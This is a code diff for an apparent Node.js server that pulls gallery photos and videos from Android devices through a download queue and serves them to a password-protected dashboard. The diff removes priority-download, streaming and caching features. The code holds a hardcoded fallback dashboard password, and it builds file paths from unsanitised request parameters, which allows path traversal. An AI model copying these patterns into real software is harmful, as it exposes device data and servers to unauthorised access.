@@ -77,34 +77,17 @@ const downloadPending    = {}; // deviceId -> [fileName, ...]
 const fileTimers = {};         // "deviceId::fileName" -> timeoutId
 const FILE_TTL_MS = 5 * 60 * 1000; // 5 minutes
 
-// Protects the file a user currently has open in the viewer from being
-// evicted (by the queue limit OR the 5-min TTL) while they're looking at it.
-// Refreshed every time the viewer re-issues its priority request.
-const activeViewFile = {};    // deviceId -> { fileName, until }
-const ACTIVE_VIEW_PROTECT_MS = 10 * 60 * 1000; // 10 min safety window
-
-function isProtected(deviceId, fileName) {
-    const p = activeViewFile[deviceId];
-    return !!p && p.fileName === fileName && Date.now() < p.until;
-}
-
 function scheduleFileCleanup(deviceId, fileName) {
     const key = `${deviceId}::${fileName}`;
     if (fileTimers[key]) clearTimeout(fileTimers[key]);
     fileTimers[key] = setTimeout(() => {
         delete fileTimers[key];
-        if (isProtected(deviceId, fileName)) {
-            // still open in someone's viewer — don't delete, check again shortly
-            scheduleFileCleanup(deviceId, fileName);
-            return;
-        }
         deleteFile(deviceId, fileName);
         console.log(`⏰ 5-min TTL expired, deleted: ${fileName} (${deviceId})`);
     }, FILE_TTL_MS);
 }
 
 function deleteFile(deviceId, fileName) {
-    if (isProtected(deviceId, fileName)) return; // actively being viewed — never evict
     try {
         const deviceDir = path.join(GALLERY_DIR, deviceId);
         const candidates = [
@@ -137,49 +120,14 @@ function addToQueue(deviceId, fileName, fileType) {
         if (!videoQueue[deviceId]) videoQueue[deviceId] = [];
         if (!videoQueue[deviceId].includes(fileName)) videoQueue[deviceId].push(fileName);
         while (videoQueue[deviceId].length > VIDEO_QUEUE_LIMIT) {
-            const idx = videoQueue[deviceId].findIndex(n => !isProtected(deviceId, n));
-            if (idx === -1) break; // everything left is actively being viewed — allow temporary overflow
-            const [victim] = videoQueue[deviceId].splice(idx, 1);
-            deleteFile(deviceId, victim);
+            deleteFile(deviceId, videoQueue[deviceId].shift());
         }
     } else {
         if (!imageQueue[deviceId]) imageQueue[deviceId] = [];
         if (!imageQueue[deviceId].includes(fileName)) imageQueue[deviceId].push(fileName);
         while (imageQueue[deviceId].length > IMAGE_QUEUE_LIMIT) {
-            const idx = imageQueue[deviceId].findIndex(n => !isProtected(deviceId, n));
-            if (idx === -1) break;
-            const [victim] = imageQueue[deviceId].splice(idx, 1);
-            deleteFile(deviceId, victim);
+            deleteFile(deviceId, imageQueue[deviceId].shift());
         }
-    }
-}
-
-// Tracks when the current in-progress download was started, so a stalled
-// device (offline, crashed, permission denied) can't block the queue forever.
-const downloadStartedAt = {}; // deviceId -> timestamp
-// Tracks the last time ANY chunk actually arrived for a device's in-progress
-// upload. Large videos (40-100MB) legitimately take longer than DOWNLOAD_STALL_MS
-// to fully transfer — as long as chunks keep landing, the transfer is alive and
-// must not be treated as stalled. Only real silence (no chunk for this long)
-// means the device is actually stuck/offline.
-const lastChunkActivity = {}; // deviceId -> timestamp of most recent chunk received
-const DOWNLOAD_STALL_MS = 25000; // give up only after this long with NO chunk activity
-
-function sendDownloadCommand(deviceId, fileName, priority) {
-    downloadInProgress[deviceId] = fileName;
-    downloadStartedAt[deviceId] = Date.now();
-    requestedFiles[`${deviceId}::${fileName}`] = Date.now();
-    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-    // Only one file should ever be "in flight" per our serial design. If the
-    // device hasn't polled yet, older gallery_file commands can still be sitting
-    // undelivered here — drop them so they can't get processed ahead of (or
-    // delay) this one when the device finally polls and gets them as a batch.
-    pendingCommands[deviceId] = pendingCommands[deviceId].filter(c => c.command !== 'gallery_file');
-    const cmd = { command: 'gallery_file', value: fileName };
-    if (priority) {
-        pendingCommands[deviceId].unshift(cmd); // ahead of any other queued command types too
-    } else {
-        pendingCommands[deviceId].push(cmd);
     }
 }
 
@@ -187,87 +135,38 @@ function sendDownloadCommand(deviceId, fileName, priority) {
 function sendNextDownload(deviceId) {
     if (!downloadPending[deviceId] || downloadPending[deviceId].length === 0) {
         downloadInProgress[deviceId] = null;
-        delete downloadStartedAt[deviceId];
         return;
     }
     const next = downloadPending[deviceId].shift();
-    sendDownloadCommand(deviceId, next);
+    downloadInProgress[deviceId] = next;
+    requestedFiles[`${deviceId}::${next}`] = Date.now();
+    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+    pendingCommands[deviceId].push({ command: 'gallery_file', value: next });
     console.log(`📤 Serial download → ${next} (${deviceId}) | queue: ${(downloadPending[deviceId]||[]).length} remaining`);
 }
 
-// Shared helper: queue a file download through the serial system (used by all endpoints).
-// priority=true means "user just clicked this" — it jumps straight to the front,
-// preempting whatever is currently downloading (which goes back to the front of
-// the queue so it resumes right after) instead of waiting in line behind it.
-function requestFileFromDevice(deviceId, fileName, priority, aheadOfQueue) {
+// Shared helper: queue a file download through the serial system (used by all endpoints)
+function requestFileFromDevice(deviceId, fileName) {
     const reqKey = `${deviceId}::${fileName}`;
-
-    if (priority) {
-        // Mark this as the file the user is actively looking at right now —
-        // protects it from queue-limit/TTL eviction while they're viewing it.
-        activeViewFile[deviceId] = { fileName, until: Date.now() + ACTIVE_VIEW_PROTECT_MS };
-        delete requestedFiles[reqKey]; // bypass the 5-min "already sent" guard
-        if (downloadPending[deviceId]) {
-            downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
-        }
-        if (downloadInProgress[deviceId] === fileName) {
-            downloadStartedAt[deviceId] = Date.now(); // still current — just refresh the stall timer
-            return 'sent';
-        }
-        if (downloadInProgress[deviceId]) {
-            if (!downloadPending[deviceId]) downloadPending[deviceId] = [];
-            downloadPending[deviceId].unshift(downloadInProgress[deviceId]); // resume it right after
-        }
-        sendDownloadCommand(deviceId, fileName, true);
-        console.log(`⚡ Priority download → ${fileName} (${deviceId})`);
-        return 'sent';
-    }
-
-    // Background/prefetch path — FIFO behavior, unless aheadOfQueue is set.
+    // Already in-progress or recently sent
     if (requestedFiles[reqKey] && (Date.now() - requestedFiles[reqKey]) < 5 * 60 * 1000) return 'already';
     if (!downloadPending[deviceId]) downloadPending[deviceId] = [];
-    if (downloadInProgress[deviceId] === fileName) return 'queued';
-    if (downloadPending[deviceId].includes(fileName)) {
-        // Already queued — if this is a viewer-navigation prefetch, move it to
-        // the front so it isn't stuck behind unrelated thumbnail requests.
-        if (aheadOfQueue) {
-            downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
-            downloadPending[deviceId].unshift(fileName);
-        }
-        return 'queued';
-    }
+    if (downloadInProgress[deviceId] === fileName || downloadPending[deviceId].includes(fileName)) return 'queued';
 
     if (downloadInProgress[deviceId]) {
-        // aheadOfQueue (e.g. "next image in viewer") jumps ahead of plain
-        // background/thumbnail prefetches already waiting, so the user isn't
-        // stuck watching a spinner for a file that was "sent" long after
-        // slower thumbnail traffic it got queued behind.
-        if (aheadOfQueue) downloadPending[deviceId].unshift(fileName);
-        else downloadPending[deviceId].push(fileName);
-        console.log(`⏳ Queued${aheadOfQueue ? ' (ahead)' : ''}: ${fileName} | pos ${downloadPending[deviceId].length} (${deviceId})`);
+        // Another file downloading → wait in line
+        downloadPending[deviceId].push(fileName);
+        console.log(`⏳ Queued: ${fileName} | pos ${downloadPending[deviceId].length} (${deviceId})`);
         return 'queued';
     }
-    sendDownloadCommand(deviceId, fileName);
+    // Nothing downloading → send immediately
+    downloadInProgress[deviceId] = fileName;
+    requestedFiles[reqKey] = Date.now();
+    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+    pendingCommands[deviceId].push({ command: 'gallery_file', value: fileName });
     console.log(`📤 Download started: ${fileName} (${deviceId})`);
     return 'sent';
 }
-
-// Watchdog: if a requested file never arrives AND no chunks are actively
-// landing (device offline/stuck), stop blocking the queue and move on.
-// A slow-but-progressing large-video upload is never considered stalled.
-setInterval(() => {
-    const now = Date.now();
-    for (const deviceId of Object.keys(downloadStartedAt)) {
-        const lastActivity = Math.max(downloadStartedAt[deviceId] || 0, lastChunkActivity[deviceId] || 0);
-        if (downloadInProgress[deviceId] && (now - lastActivity) > DOWNLOAD_STALL_MS) {
-            console.log(`⏱️ Download stalled, skipping: ${downloadInProgress[deviceId]} (${deviceId})`);
-            delete downloadStartedAt[deviceId];
-            delete lastChunkActivity[deviceId];
-            downloadInProgress[deviceId] = null;
-            sendNextDownload(deviceId);
-        }
-    }
-}, 5000);
 
 // ========== AUTH ==========
 const DASHBOARD_PASSWORD = process.env.DASHBOARD_PASSWORD || 'ajaybabu95';
@@ -557,9 +456,14 @@ app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             });
         }
 
-        // File not on disk — user clicked it, so it jumps the queue ahead of
-        // any background prefetch/thumbnail requests already in flight
-        const status = requestFileFromDevice(deviceId, fileName, true);
+        // File not on disk — force fresh request every time user clicks
+        const reqKey = `${deviceId}::${fileName}`;
+        delete requestedFiles[reqKey];                                            // bypass 5-min cache
+        if (downloadPending[deviceId])                                            // remove from pending so it re-queues fresh
+            downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
+        if (downloadInProgress[deviceId] === fileName)                            // if mid-download, reset so command resends
+            downloadInProgress[deviceId] = null;
+        const status = requestFileFromDevice(deviceId, fileName);
         res.json({ success: false, pending: true, status, message: 'Requesting file from device...' });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -606,7 +510,6 @@ app.post('/api/upload/file', (req, res) => {
         addToQueue(deviceId, file.name, file.type || 'image');
         delete requestedFiles[`${deviceId}::${file.name}`];
         scheduleFileCleanup(deviceId, file.name);
-        if (downloadInProgress[deviceId] === file.name) { delete downloadStartedAt[deviceId]; delete lastChunkActivity[deviceId]; }
         sendNextDownload(deviceId);
         io.emit('gallery_update', { deviceId, fileName: file.name, type: file.type || 'image' });
         res.json({
@@ -639,20 +542,8 @@ app.post('/api/upload/chunk', async (req, res) => {
         const chunkPath = path.join(folderDir, `${file.name}.part${file.chunkIndex}`);
         fs.writeFileSync(chunkPath, Buffer.from(file.data, 'base64'));
 
-        // Mark this device's upload as actively alive — a slow-but-progressing
-        // large video must never be treated as stalled by the queue watchdog.
-        lastChunkActivity[deviceId] = Date.now();
-
         const totalChunks = file.totalChunks || 1;
         console.log(`📦 Chunk ${file.chunkIndex + 1}/${totalChunks}: ${file.name} from ${deviceId}`);
-
-        // Tell anyone watching this file exactly which chunk just landed, so
-        // the viewer can show live "chunk 3/40 aa gaya" progress instead of a
-        // generic spinner.
-        io.emit('gallery_chunk', {
-            deviceId, fileName: file.name,
-            chunkIndex: file.chunkIndex, totalChunks
-        });
 
         // Check whether all chunks are present
         for (let i = 0; i < totalChunks; i++) {
@@ -695,7 +586,6 @@ app.post('/api/upload/chunk', async (req, res) => {
         addToQueue(deviceId, file.name, 'video');
         delete requestedFiles[`${deviceId}::${file.name}`];
         scheduleFileCleanup(deviceId, file.name);
-        if (downloadInProgress[deviceId] === file.name) { delete downloadStartedAt[deviceId]; delete lastChunkActivity[deviceId]; }
         sendNextDownload(deviceId);
         io.emit('gallery_update', { deviceId, fileName: file.name, type: 'video' });
 
@@ -709,9 +599,9 @@ app.post('/api/upload/chunk', async (req, res) => {
 // Serial file request — 1 download at a time; others wait in queue
 app.post('/api/gallery/request', (req, res) => {
     try {
-        const { deviceId, fileName, priority, aheadOfQueue } = req.body;
+        const { deviceId, fileName } = req.body;
         if (!deviceId || !fileName) return res.status(400).json({ success: false, error: 'Missing params' });
-        const status = requestFileFromDevice(deviceId, fileName, !!priority, !!aheadOfQueue);
+        const status = requestFileFromDevice(deviceId, fileName);
         res.json({ success: true, status });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -1179,97 +1069,6 @@ app.get('/api/gallery/video/:deviceId/:fileName', (req, res) => {
     }
 });
 
-// ========== VIDEO STREAMING (instant-play endpoint) ==========
-// Same Range/206 mechanics as /api/gallery/video, but geared for the
-// autoplay <video> tag: looks in the right subfolder, and if the file
-// isn't on disk yet it kicks a priority request to the device and waits
-// briefly (files that are already cached, or small/fast ones, play near-
-// instantly; larger in-flight uploads fall back to the client's existing
-// retry loop instead of hanging here).
-app.get('/api/gallery/stream/:deviceId/:fileName', async (req, res) => {
-    try {
-        const { deviceId, fileName } = req.params;
-        const folder = req.query.folder || null;
-        const deviceDir = path.join(GALLERY_DIR, deviceId);
-
-        function locate() {
-            if (folder) {
-                const fp = path.join(deviceDir, folder, fileName);
-                if (fs.existsSync(fp)) return fp;
-            }
-            const dp = path.join(deviceDir, fileName);
-            if (fs.existsSync(dp)) return dp;
-            if (fs.existsSync(deviceDir)) {
-                for (const sub of fs.readdirSync(deviceDir)) {
-                    const candidate = path.join(deviceDir, sub, fileName);
-                    if (fs.existsSync(candidate)) return candidate;
-                }
-            }
-            return null;
-        }
-
-        let filePath = locate();
-
-        if (!filePath) {
-            // Use the existing priority/serial-download system (not a raw
-            // pendingCommands push) so this stays consistent with the queue,
-            // stall watchdog, and eviction-protection already in place.
-            requestFileFromDevice(deviceId, fileName, true);
-
-            let waited = 0;
-            while (waited < 10000) {
-                await new Promise(resolve => setTimeout(resolve, 500));
-                filePath = locate();
-                if (filePath) break;
-                waited += 500;
-            }
-
-            if (!filePath) {
-                return res.status(404).json({ error: 'Video not available yet' });
-            }
-        }
-
-        // Keep protecting this file from eviction while it's being streamed.
-        activeViewFile[deviceId] = { fileName, until: Date.now() + ACTIVE_VIEW_PROTECT_MS };
-
-        const ext = path.extname(fileName).toLowerCase().replace('.', '');
-        const mimeMap = {
-            mp4: 'video/mp4', '3gp': 'video/3gpp', mkv: 'video/x-matroska',
-            webm: 'video/webm', mov: 'video/quicktime', avi: 'video/x-msvideo'
-        };
-        const contentType = mimeMap[ext] || 'video/mp4';
-        const fileSize = fs.statSync(filePath).size;
-        const range = req.headers.range;
-
-        if (range) {
-            const parts = range.replace(/bytes=/, '').split('-');
-            const start = parseInt(parts[0], 10) || 0;
-            const end = parts[1] ? Math.min(parseInt(parts[1], 10), fileSize - 1) : fileSize - 1;
-            const chunksize = (end - start) + 1;
-
-            res.writeHead(206, {
-                'Content-Range': `bytes ${start}-${end}/${fileSize}`,
-                'Accept-Ranges': 'bytes',
-                'Content-Length': chunksize,
-                'Content-Type': contentType,
-                'Content-Disposition': 'inline'
-            });
-            fs.createReadStream(filePath, { start, end }).pipe(res);
-        } else {
-            res.writeHead(200, {
-                'Content-Length': fileSize,
-                'Content-Type': contentType,
-                'Accept-Ranges': 'bytes',
-                'Content-Disposition': 'inline'
-            });
-            fs.createReadStream(filePath).pipe(res);
-        }
-    } catch (e) {
-        console.error('❌ Streaming error:', e.message);
-        if (!res.headersSent) res.status(500).json({ error: e.message });
-    }
-});
-
 // ========== THUMBNAIL API ==========
 app.get('/api/gallery/thumb/:deviceId/:fileName', async (req, res) => {
     try {
@@ -1415,7 +1214,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         <div style="font-size:13px;color:#666;margin-top:8px;" id="viewerLoadingNote"></div>
         <div id="retryBar" style="display:none;margin-top:14px;width:220px;margin-left:auto;margin-right:auto;">
             <div style="display:flex;justify-content:space-between;font-size:11px;color:#555;margin-bottom:4px;">
-                <span>Status</span><span id="retryLabel">Try #0</span>
+                <span>Progress</span><span id="retryLabel">0/15</span>
             </div>
             <div style="background:#222;border-radius:4px;height:6px;overflow:hidden;">
                 <div id="retryFill" style="background:#667eea;height:100%;width:0%;transition:width .3s;"></div>
@@ -1423,7 +1222,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         </div>
     </div>
     <img id="viewerImg" class="v-media" src="" alt="" style="display:none;">
-    <video id="viewerVid" class="v-media" controls playsinline autoplay style="display:none;"></video>
+    <video id="viewerVid" class="v-media" controls playsinline style="display:none;"></video>
     <div id="vidPlayOverlay" onclick="playVideo()">
         <div class="play-circle">▶</div>
         <div class="play-label">Play</div>
@@ -1446,37 +1245,12 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     let currentIndex = 0;
     let viewerDataUrl = '';
 
-    // ── Client-side image cache ───────────────────────
-    // Stores prefetched image dataUrls keyed by fileName so next-image
-    // navigation is instant (no round-trip fetch needed).
-    // Each entry: { dataUrl, expiry } — auto-cleared after 60 seconds.
-    const _imgCache = {};
-
-    function _cacheSet(name, dataUrl) {
-        _imgCache[name] = { dataUrl, expiry: Date.now() + 60000 };
-    }
-    function _cacheGet(name) {
-        const e = _imgCache[name];
-        if (!e) return null;
-        if (Date.now() > e.expiry) { delete _imgCache[name]; return null; }
-        return e.dataUrl;
-    }
-    // Sweep stale entries every 60 s so memory stays clean
-    setInterval(function() {
-        const now = Date.now();
-        Object.keys(_imgCache).forEach(function(k) {
-            if (now > _imgCache[k].expiry) delete _imgCache[k];
-        });
-    }, 60000);
-
     // ── Video retry state ─────────────────────────────
-    // No cap — keeps retrying every VID_RETRY_MS until the video actually
-    // plays, no matter how long the upload takes.
+    const VID_MAX_RETRIES = 15;
     const VID_RETRY_MS    = 2000;
     let _vidRetryTimer  = null;
     let _vidRetryCount  = 0;
     let _vidWaitingFile = null; // file we're currently retrying for
-    let _vidChunkNote   = '';   // last "Chunk X/Y aa gaya" text for the waiting file
 
     // ── Helpers ───────────────────────────────────────
     function getMime(fileName, type) {
@@ -1637,19 +1411,17 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     }
 
     // ── Viewer loading helpers ────────────────────────
-    // No fixed max anymore — retryN is just "attempt #N so far", shown as a
-    // running counter (not a fraction of some cap), since we now retry
-    // forever until the video actually plays.
-    function showViewerLoading(title, note, retryN) {
+    function showViewerLoading(title, note, retryN, retryMax) {
         document.getElementById('viewerLoading').style.display = 'block';
         document.getElementById('viewerLoadingTitle').textContent = title || 'Loading...';
         document.getElementById('viewerLoadingNote').textContent  = note  || '';
         document.getElementById('viewerImg').style.display = 'none';
+        // show retry progress bar only when retrying
         const bar = document.getElementById('retryBar');
-        if (retryN !== undefined) {
+        if (retryN !== undefined && retryMax) {
             bar.style.display = 'block';
-            document.getElementById('retryLabel').textContent = 'Try #' + retryN;
-            document.getElementById('retryFill').style.width  = '100%';
+            document.getElementById('retryLabel').textContent = retryN + '/' + retryMax;
+            document.getElementById('retryFill').style.width  = Math.round(retryN / retryMax * 100) + '%';
         } else {
             bar.style.display = 'none';
         }
@@ -1665,7 +1437,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         _vidRetryTimer  = null;
         _vidRetryCount  = 0;
         _vidWaitingFile = null;
-        _vidChunkNote   = '';
         const v = document.getElementById('viewerVid');
         v.onerror = null; v.oncanplay = null; v.onloadeddata = null;
         v.pause();
@@ -1674,11 +1445,9 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     }
 
     // ── Video retry loader ────────────────────────────
-    // Retries FOREVER, every VID_RETRY_MS, until the video actually plays —
-    // no attempt cap. Each attempt shows the live chunk-arrival status
-    // (updated by the gallery_chunk socket listener below) so the user can
-    // see exactly how far the upload has gotten.
+    // Tries to play a video with up to VID_MAX_RETRIES attempts.
     // On first error → requests file from device.
+    // Each retry updates the progress bar.
     // When gallery_update arrives → cancels retry loop and plays immediately.
     function _startVideoRetry(file, retryCount) {
         if (!document.getElementById('viewer').classList.contains('active')) return;
@@ -1689,24 +1458,16 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         _vidRetryCount  = retryCount;
 
         const vidEl = document.getElementById('viewerVid');
-        const streamUrl = '/api/gallery/stream/' + deviceId + '/' + encodeURIComponent(file.name) +
+        const streamUrl = '/api/gallery/video/' + deviceId + '/' + encodeURIComponent(file.name) +
                           '?folder=' + encodeURIComponent(file.folder || currentFolderName || '') +
                           '&t=' + Date.now(); // cache-bust so browser re-checks
 
         vidEl.onerror = null; vidEl.oncanplay = null; vidEl.onloadeddata = null;
 
         if (retryCount === 0) {
-            _vidChunkNote = '';
             showViewerLoading('⏳ Video load ho rahi hai...', 'Browser se range request...');
-            // Ask device for a fresh copy right away (priority, jumps the queue) —
-            // don't wait for a playback error, so a stale/frozen cached file on
-            // disk can't silently block a re-download of the clicked video.
-            fetch('/api/gallery/request', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ deviceId, fileName: file.name, priority: true })
-            }).catch(()=>{});
         } else {
-            showViewerLoading('📡 Upload ka wait kar rahe hain...', _vidChunkNote || 'Device se aa rahi hai', retryCount);
+            showViewerLoading('📡 Upload ka wait kar rahe hain...', 'Device se aa rahi hai', retryCount, VID_MAX_RETRIES);
         }
 
         // Success — video has data, autoplay
@@ -1722,16 +1483,28 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
 
         vidEl.onerror = function() {
             vidEl.onerror = null; vidEl.onloadeddata = null;
-            // (priority request for this file was already sent when the retry loop started)
 
-            const next = retryCount + 1;
-            showViewerLoading('📡 Upload ka wait...', _vidChunkNote || 'Device se aa rahi hai', next);
-            _vidRetryTimer = setTimeout(() => {
-                if (document.getElementById('viewer').classList.contains('active')) {
-                    vidEl.src = ''; vidEl.load();
-                    _startVideoRetry(file, next);
-                }
-            }, VID_RETRY_MS);
+            if (retryCount === 0) {
+                // First failure: ask device to send the file
+                fetch('/api/gallery/request', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ deviceId, fileName: file.name })
+                }).catch(()=>{});
+            }
+
+            if (retryCount < VID_MAX_RETRIES) {
+                const next = retryCount + 1;
+                showViewerLoading('📡 Upload ka wait...', 'Device se aa rahi hai', next, VID_MAX_RETRIES);
+                _vidRetryTimer = setTimeout(() => {
+                    if (document.getElementById('viewer').classList.contains('active')) {
+                        vidEl.src = ''; vidEl.load();
+                        _startVideoRetry(file, next);
+                    }
+                }, VID_RETRY_MS);
+            } else {
+                showViewerLoading('❌ Video nahi mili', 'Close karke dobara try karein ya device se re-upload karein');
+                _vidWaitingFile = null;
+            }
         };
 
         vidEl.src = streamUrl;
@@ -1762,98 +1535,44 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
                             '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
             _startVideoRetry(file, 0);
         } else {
-            // ── Check client-side cache first ─────────────────
-            // If prefetched while viewing the previous image, show instantly.
-            const cached = _cacheGet(file.name);
-            if (cached) {
-                delete _imgCache[file.name]; // consumed
-                viewerDataUrl = cached;
-                hideViewerLoading();
-                const imgEl = document.getElementById('viewerImg');
-                imgEl.src = cached; imgEl.style.display = 'block';
-                prefetchNext(index); // start prefetching the one after this
-                return;
-            }
-
-            // ── Not cached — fetch with FULL PRIORITY ─────────
-            // Current image gets undivided device attention.
-            // Next-image prefetch starts only AFTER this one is showing,
-            // so the device queue is never split while user is waiting.
-            showViewerLoading('⏳ Opening...');
+            showViewerLoading('⏳ Image load ho rahi hai...');
             const url = '/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name) +
                         '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
-
-            function _pollImage(attempts) {
-                if (!document.getElementById('viewer').classList.contains('active')) return;
-                if (currentIndex !== index) return;
-                fetch(url)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (currentIndex !== index) return;
-                        if (data.success && data.data) {
-                            const mime = getMime(file.name, data.type || file.type);
-                            const dataUrl = 'data:' + mime + ';base64,' + data.data;
-                            viewerDataUrl = dataUrl;
-                            hideViewerLoading();
-                            const imgEl = document.getElementById('viewerImg');
-                            imgEl.src = dataUrl; imgEl.style.display = 'block';
-                            prefetchNext(index);
-                        } else if (data.pending) {
-                            // silent retry — loading spinner already showing, no text change
-                            setTimeout(function() { _pollImage(attempts + 1); }, 1500);
-                        } else {
-                            hideViewerLoading();
-                            const imgEl = document.getElementById('viewerImg');
-                            imgEl.alt = '❌ File not found'; imgEl.style.display = 'block';
-                        }
-                    })
-                    .catch(() => {
-                        setTimeout(function() { _pollImage(attempts + 1); }, 1500);
-                    });
-            }
-            _pollImage(0);
+            fetch(url)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.success && data.data) {
+                        const mime = getMime(file.name, data.type || file.type);
+                        const dataUrl = 'data:' + mime + ';base64,' + data.data;
+                        viewerDataUrl = dataUrl;
+                        hideViewerLoading();
+                        const imgEl = document.getElementById('viewerImg');
+                        imgEl.src = dataUrl; imgEl.style.display = 'block';
+                        prefetchFiles(index);
+                    } else if (data.pending) {
+                        showViewerLoading('⏳ Device se download ho rahi hai...');
+                        prefetchFiles(index);
+                        setTimeout(function() {
+                            if (document.getElementById('viewer').classList.contains('active') && currentIndex === index) openViewer(index);
+                        }, 3000);
+                    } else {
+                        hideViewerLoading();
+                        const imgEl = document.getElementById('viewerImg');
+                        imgEl.alt = '❌ File not found'; imgEl.style.display = 'block';
+                    }
+                })
+                .catch(() => showViewerLoading('❌ Network error'));
         }
     }
 
-    // Sends device request for the NEXT image and caches its data in memory
-    // so the following "next" click is instant (zero loading).
-    // Only starts AFTER the current image is already on screen, so the device
-    // isn't juggling two downloads while the user is waiting for one.
-    function prefetchNext(fromIndex) {
+    function prefetchFiles(fromIndex) {
+        const cur = currentFolderFiles[fromIndex];
+        if (!cur || cur.type === 'video') return;
         for (let i = fromIndex + 1; i < currentFolderFiles.length; i++) {
             const f = currentFolderFiles[i];
             if (!f || f.type === 'video') continue;
-            if (_cacheGet(f.name)) break; // already cached
-
-            const fileUrl = '/api/gallery/file/' + deviceId + '/' + encodeURIComponent(f.name) +
-                            '?folder=' + encodeURIComponent(f.folder || currentFolderName || '');
-
-            // Ask device to send next image (queue-jump, not full priority so
-            // it doesn't interrupt an already-running download for another user)
-            fetch('/api/gallery/request', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ deviceId, fileName: f.name, aheadOfQueue: true })
-            })
-            .then(() => {
-                // Poll server until next image's data is on disk, then cache it
-                function tryCache(attempts) {
-                    if (_cacheGet(f.name)) return; // already stored by another path
-                    fetch(fileUrl)
-                        .then(r => r.json())
-                        .then(data => {
-                            if (data.success && data.data) {
-                                const mime = getMime(f.name, data.type || f.type);
-                                _cacheSet(f.name, 'data:' + mime + ';base64,' + data.data);
-                            } else if (data.pending && attempts < 40) {
-                                setTimeout(() => tryCache(attempts + 1), 1500);
-                            }
-                        })
-                        .catch(() => {});
-                }
-                tryCache(0);
-            })
-            .catch(() => {});
-            break; // only the immediate next image
+            fetch('/api/gallery/request', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ deviceId, fileName:f.name }) }).catch(()=>{});
+            break;
         }
     }
 
@@ -1904,19 +1623,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     let _galReloadTimer = null;
     const _galSocket = io({ transports: ['websocket', 'polling'] });
 
-    // Live per-chunk progress — shows "Chunk 3/40 aa gaya" as each piece of
-    // the video arrives from the device, so the wait is never a black box.
-    _galSocket.on('gallery_chunk', function(data) {
-        if (data.deviceId !== deviceId || data.fileName !== _vidWaitingFile) return;
-        const n = data.chunkIndex + 1;
-        _vidChunkNote = '📦 Chunk ' + n + '/' + data.totalChunks + ' aa gaya (' +
-                        Math.round(n / data.totalChunks * 100) + '%)';
-        const noteEl = document.getElementById('viewerLoadingNote');
-        if (noteEl && document.getElementById('viewerLoading').style.display !== 'none') {
-            noteEl.textContent = _vidChunkNote;
-        }
-    });
-
     _galSocket.on('gallery_update', function(data) {
         if (data.deviceId !== deviceId) return;
 
@@ -1964,7 +1670,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             vidEl.onerror = function() {
                 // Upload event fired before file was fully flushed — retry once more
                 vidEl.onerror = null;
-                _startVideoRetry(file, _vidRetryCount + 1);
+                _startVideoRetry(file, Math.min(_vidRetryCount + 1, VID_MAX_RETRIES - 1));
             };
             vidEl.src = streamUrl;
             vidEl.load();
@@ -2006,7 +1712,6 @@ io.on('connection', (socket) => {
 
         socket.deviceId = canonicalId;
         socket.join('streamers');
-        socket.join(`device_${canonicalId}`);
 
         console.log(`📡 Device [${canonicalId}] registered for WebSocket stream`);
         socket.emit('settings', getDeviceSettings(canonicalId));
@@ -2022,168 +1727,6 @@ io.on('connection', (socket) => {
             lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
             galleryCount: (galleryData[device.id] || []).length
         });
-    });
-
-    // Generic Android WebSocket registration. This works alongside the
-    // existing register_stream event used by the live camera stream.
-    socket.on('register', (data = {}) => {
-        const { deviceId, deviceName, cameraReady, streaming, cameraType,
-            quality, fps, batteryPercentage, batteryOptimization,
-            charging, timestamp } = data;
-        if (!deviceId) {
-            console.log(`⚠️ WS register rejected — missing deviceId (${socket.id})`);
-            return socket.emit('register_ack', { success: false, error: 'Missing deviceId' });
-        }
-
-        const canonical = findCanonicalDevice(deviceId);
-        const canonicalId = canonical ? canonical.id : deviceId;
-        let device = devices.find(d => d.id === canonicalId);
-        if (!device) {
-            device = {
-                id: canonicalId,
-                name: deviceName || 'Android Device',
-                connectedAt: new Date().toLocaleTimeString(),
-                firstSeen: Date.now()
-            };
-            devices.push(device);
-        }
-
-        if (deviceName) device.name = deviceName;
-        if (cameraReady !== undefined) device.cameraReady = cameraReady;
-        if (streaming !== undefined) device.streaming = streaming;
-        if (cameraType !== undefined) device.cameraType = cameraType;
-        if (quality !== undefined) device.quality = quality;
-        if (fps !== undefined) device.fps = fps;
-        if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
-        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
-        if (charging !== undefined) device.charging = charging;
-        if (timestamp !== undefined) device.timestamp = timestamp;
-        device.lastHeartbeat = new Date().toLocaleTimeString();
-        device.lastSeen = Date.now();
-        device.hasWebSocket = true;
-
-        socket.deviceId = canonicalId;
-        socket.join(`device_${canonicalId}`);
-        saveDevices();
-        console.log(`📱 WS register: ${canonicalId} (${device.name})`);
-        socket.emit('register_ack', { success: true, deviceId: canonicalId });
